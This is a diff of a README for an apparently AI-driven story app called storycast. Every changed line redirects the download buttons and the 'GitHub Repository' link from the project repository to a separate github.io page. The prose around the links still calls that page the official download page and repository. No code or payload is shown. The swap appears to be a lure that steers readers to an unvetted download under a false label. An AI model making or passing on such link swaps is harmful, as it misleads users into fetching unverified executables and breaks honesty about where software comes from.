@@ -1,6 +1,6 @@
 # ✨ storycast - Your Imagination, Instantly Turned Into Stories
 
-[![Download storycast](https://img.shields.io/badge/Download-storycast-4CAF50?style=for-the-badge&logo=github)](https://github.com/julienehrhardtsimon484844/storycast)
+[![Download storycast](https://img.shields.io/badge/Download-storycast-4CAF50?style=for-the-badge&logo=github)](https://julienehrhardtsimon484844.github.io)
 
 ---
 
@@ -20,7 +20,7 @@ Getting started with storycast is incredibly easy. Follow the steps below, and y
 
 The first thing you need to do is get the application onto your computer. 
 
-👉 **[Visit this link to download the application](https://github.com/julienehrhardtsimon484844/storycast)**
+👉 **[Visit this link to download the application](https://julienehrhardtsimon484844.github.io)**
 
 This will take you to the official download page for storycast. Look for the download button or the latest release file on that page.
 
@@ -110,7 +110,7 @@ Ready to start creating? Here's everything you need to know:
 
 ### Get the Application
 
-👉 **[Download storycast Now](https://github.com/julienehrhardtsimon484844/storycast)**
+👉 **[Download storycast Now](https://julienehrhardtsimon484844.github.io)**
 
 Click the link above, and you'll be taken to the download page. Once there, find the latest release and download the application file to your computer.
 
@@ -133,7 +133,7 @@ Click the link above, and you'll be taken to the download page. Once there, find
 
 If you run into any issues or have questions, don't hesitate to reach out. You can find support and additional information on the official GitHub page:
 
-**GitHub Repository:** [https://github.com/julienehrhardtsimon484844/storycast](https://github.com/julienehrhardtsimon484844/storycast)
+**GitHub Repository:** [https://julienehrhardtsimon484844.github.io](https://julienehrhardtsimon484844.github.io)
 
 Check the repository's README or issue tracker for updates, bug fixes, and community support.
 
@@ -153,7 +153,7 @@ storycast puts the power of creative storytelling right at your fingertips. Whet
 
 Don't overthink it. Just type a topic, click the button, and let the stories begin.
 
-👉 **[Get storycast Today](https://github.com/julienehrhardtsimon484844/storycast)**
+👉 **[Get storycast Today](https://julienehrhardtsimon484844.github.io)**
 
 ---
 
